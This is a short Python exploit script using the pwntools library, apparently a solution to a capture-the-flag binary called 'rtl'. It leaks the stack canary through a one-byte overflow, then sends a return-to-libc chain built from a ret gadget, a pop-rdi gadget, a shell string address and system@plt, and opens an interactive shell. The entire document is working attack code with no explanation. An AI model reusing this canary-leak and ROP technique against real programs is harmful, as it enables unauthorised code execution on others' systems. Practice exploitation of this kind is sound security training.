from pwn import *

p = process('./rtl')
e = ELF('rtl')
shell = 0x400874

buf = b"b"*0x39
p.sendafter(b"Buf:", buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recv(7))
print(hex(cnry))

buf = b"A"*0x38 + p64(cnry) + b"A"*0x8
buf += p64(0x400285) # ret
buf += p64(0x400853) # pop_rdi
buf += p64(0x400874) # shell
buf += p64(e.plt['system'])

p.sendafter(b"Buf: ", buf)

p.interactive()